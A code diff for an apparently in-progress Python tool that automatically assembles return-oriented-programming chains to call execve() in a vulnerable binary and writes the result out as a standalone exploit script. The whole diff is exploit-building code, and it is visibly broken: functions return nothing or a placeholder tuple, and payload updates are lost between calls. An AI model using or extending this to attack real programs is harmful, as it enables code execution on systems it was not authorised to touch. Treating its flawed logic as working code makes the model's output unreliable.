@@ -56,12 +56,12 @@ def execveROPChain(GadgetList, vulnExecutable):
 
     # Will always go for int 0x80(if present) because rax should be incremented only 11 times for execve()
     elif len(intList) > 0 : 
-        (execveChain, payload) = case1(GadgetList)
-        return (execveChain, payload)
+        payload = case1(GadgetList)
+        return payload
     
     if len(syscallList) > 0: 
-        (execveChain, payload) = case1(GadgetList)
-        return (execveChain, payload)
+        payload = case1(GadgetList)
+        return payload
     
     print("If this is getting printed, it means there are no special instructions found. So, you know what this means!")
 
@@ -71,7 +71,268 @@ def execveROPChain(GadgetList, vulnExecutable):
 # If int 0x80 is present.
 def case1(GadgetList) : 
 
+    payload = bytes()
+    fd = open("execveChain.py", "w")
+    writeHeader(fd)
+
+    raxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rax")
+
+    print_pretty.print_pretty(raxList)
+
+    # rax <- 11
+    x = 0
+    while x < len(raxList) : 
+
+        gadget = raxList[x]
+        inst = gadget[0]
+
+        if inst.mnemonic == "pop" : 
+                
+            # "pop rax; ret" found. 
+            # Steps to be taken: 
+                # Put 11 in the payload
+                # Execute "pop rax; ret"
+               
+            # Update payload
+            payload += struct.pack("<Q", 11)
+            payload += struct.pack("<Q", int(inst.address))
+                
+
+            # Write it into the file
+            fd.write("payload += struct.pack('<Q', 11)")
+            fd.write("\n\t")
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write(hex(int(inst.address)))
+            fd.write(")")
+            fd.write("\n\t")
+  
+        if inst.mnemonic == "xor" : 
+
+            # "xor rax, rax; ret" found
+            # Jackpot!
+            # Steps to do: 
+                # Execute "xor rax, rax; ret"
+                # Find for arithmetic gadgets which will increase rax's value to 11
+
+            # Update payload
+            payload += struct.pack("<Q", int(inst.address))
+
+            # Write it into the file
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write(hex(int(inst.address)))
+            fd.write(")")
+            fd.write("\n\t")
+
+            if changeRegValue(GadgetList, "rax", 0, 11, payload, fd) == 0: 
+                print("Unable to find gadgets which can change rax's value")
+                print("Exiting...")
+                sys.exit()
+
+        # Keep the loop going!
+        x = x + 1
+
+
+def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) : 
+
+    print("Inside changeRegValue")
+
+    RegArithList = categorize.queryGadgets(GadgetList, general.ARITHMETICG, Reg)
+
+    # A variable 
+    const = 0
+    x = 0
+    while x < len(RegArithList) : 
+
+        gadget = RegArithList[x]
+        inst = gadget[0]
+
+        if inst.mnemonic == "inc" : 
+            
+            if FinalValue > CurrentValue : 
+                
+                counter = 0
+                while counter < (FinalValue - CurrentValue) : 
+                    
+                    # Execute "inc Reg; ret"
+
+                    # Update payload
+                    payload += struct.pack("<Q", int(inst.address))
+
+                    # Write into file
+                    fd.write("payload += struct.pack('<Q', ")
+                    fd.write(hex(int(inst.address)))
+                    fd.write(")")
+                    fd.write("\n\t")
+
+                    counter = counter + 1
+
+            return 1
+
+        if inst.mnemonic == "dec" : 
+
+            if FinalValue < CurrentValue : 
+
+                counter = 0
+                while counter < (CurrentValue - FinalValue) : 
+
+                    # Execute "dec Reg; ret"
+
+                    # Update payload
+                    payload += struct.pack("<Q", int(inst.address))
+
+                    # Write into file
+                    fd.write("payload += struct.pack('<Q', ")
+                    fd.write(hex(int(inst.address)))
+                    fd.write(")")
+                    fd.write("\n\t")
+
+                    counter = counter + 1
+            
+            return 1
+        
+        if inst.mnemonic == "add" : 
+
+            operands = inst.op_str.split(';')
+            
+            if len(operands) == 2: 
+                operands = categorize.getStrippedOperands(operands)
+            
+                if operands[1].isnumeric() : 
+                    const = int(operands[1])
+
+            if const == 1 and FinalValue > CurrentValue : 
+
+                counter = 0
+                while counter < (FinalValue - CurrentValue) : 
+
+                    # execute "add Reg, 1; ret"
+
+                    # Update payload
+                    payload += struct.pack("<Q", int(inst.address))
+
+                    # Write into file
+                    fd.write("payload += struct.pack('<Q', ")
+                    fd.write(hex(int(inst.address)))
+                    fd.write(")")
+                    fd.write("\n\t")
+
+                    counter = counter + 1
+
+                return 1
+
+            if const > 1 and FinalValue > CurrentValue :
+                
+                gap = FinalValue - CurrentValue
+                quo = gap / const
+                rem = gap % const
+
+                while quo > 0 : 
+
+                    # execute add Reg, const; ret"
+
+                    # Update payload
+                    payload += struct.pack("<Q", int(inst.address))
+
+                    # Write into file
+                    fd.write("payload += struct.pack('<Q', ")
+                    fd.write(hex(int(inst.address)))
+                    fd.write(")")
+                    fd.write("\n\t")
+                    
+                    quo = quo - 1
+
+                    CurrentValue = CurrentValue + const
+
+                if FinalValue == CurrentValue: 
+                    return 1
+
+                if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) == 0: 
+                    print("Unable to find gadgets which can change rax's value")
+                    print("Exiting...")
+                    sys.exit()
+
+            if const == -1 and FinalValue < CurrentValue: 
+                
+                counter = 0
+                while counter < CurrentValue - FinalValue : 
+
+                    # execute "add Reg, -1; ret"
+
+                    # Update payload
+                    payload += struct.pack("<Q", int(inst.address))
+
+                    # Write into file
+                    fd.write("payload += struct.pack('<Q', ")
+                    fd.write(hex(int(inst.address)))
+                    fd.write(")")
+                    fd.write("\n\t")
+                    
+                    counter = counter + 1
+                
+                return 1
+            
+            if const < -1 and FinalValue < CurrentValue : 
     
+                gap = CurrentValue - FinalValue
+                quo = gap / (-(const))
+                    
+                while quo > 0: 
+
+                    # execute "add Reg, -ve number; ret"
+
+                    # Update payload
+                    payload += struct.pack("<Q", int(inst.address))
+
+                    # Write into file
+                    fd.write("payload += struct.pack('<Q', ")
+                    fd.write(hex(int(inst.address)))
+                    fd.write(")")
+                    fd.write("\n\t")
+                            
+                    quo = quo - 1
+
+                    CurrentValue = CurrentValue + const
+                
+                if FinalValue == CurrentValue : 
+                    return 1
+                
+                if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) == 0: 
+                    print("Unable to find gadgets which can change rax's value")
+                    print("Exiting...")
+                    sys.exit()
+            
+        # TODO: Do the same for sub instruction
+        # Take care of recursive calls properly.
+
+        # main while loop
+        # Keep it going!
+        x = x + 1
+
+
+    return ("qwwe", "123")
+
+
+def writeHeader(fd) : 
+
+    fd.write("#!/usr/bin/env python3")
+    fd.write("\n\n")
+    fd.write("import struct")
+    fd.write("\n\n")
+    fd.write("if __name__ == '__main__' : ")
+    fd.write("\n\n\t")
+    fd.write("# Enter the amount of junk required")
+    fd.write("\n\t")
+    fd.write("\tpayload = ''")
+    fd.write("\n\n\t")
+
+    
+
+
+
+
+
+
+
 
         
     
